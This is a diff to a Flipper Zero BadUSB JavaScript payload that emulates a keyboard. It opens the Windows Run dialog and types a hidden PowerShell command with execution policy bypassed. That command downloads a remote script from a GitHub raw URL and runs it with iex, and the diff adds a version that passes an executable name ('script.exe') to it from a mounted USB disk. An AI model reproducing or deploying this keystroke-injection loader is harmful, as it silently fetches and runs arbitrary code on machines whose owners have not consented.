@@ -1,3 +1,7 @@
+let layout = "en-US";
+let scriptName = "script.exe";
+//let scriptName = undefined;
+// undefined = script.exe (default)
 let usbdisk = require("usbdisk");
 let storage = require("storage");
 let badusb = require("badusb");
@@ -40,6 +44,7 @@ badusb.setup({
   pid: 0xbbbb,
   mfr_name: "Flipper",
   prod_name: "Zero",
+  layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl",
 });
 // Wait until connected
 print("Connect device to USB");
@@ -53,9 +58,18 @@ print("USB is connected");
 notify.success();
 badusb.press("GUI", "r");
 delay(500);
-badusb.println(
-  "powershell -w h -Ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/JS/Script-runner/Run-script.ps1 | iex"
-);
+if (scriptName) {
+  badusb.println(
+    'powershell -w h -Ep Bypass $scriptName="' +
+      scriptName +
+      '";irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/JS/Script-runner/Run-script.ps1 | iex'
+  );
+} else {
+  badusb.println(
+    "powershell -w h -Ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/JS/Script-runner/Run-script.ps1 | iex"
+  );
+}
+
 badusb.quit();
 delay(4000);
 print("Running script");
@@ -64,9 +78,13 @@ usbdisk.start(diskPath);
 notify.success();
 while (!usbdisk.wasEjected()) {
   notify.blink("green", "short");
-  delay(1000);
+  delay(250);
 }
 notify.success();
 print("Ejected, stopping UsbDisk...");
 usbdisk.stop();
 print("Done");
+for (let i = 0; i < 5; i++) {
+  notify.blink("green", "short");
+  delay(50);
+}
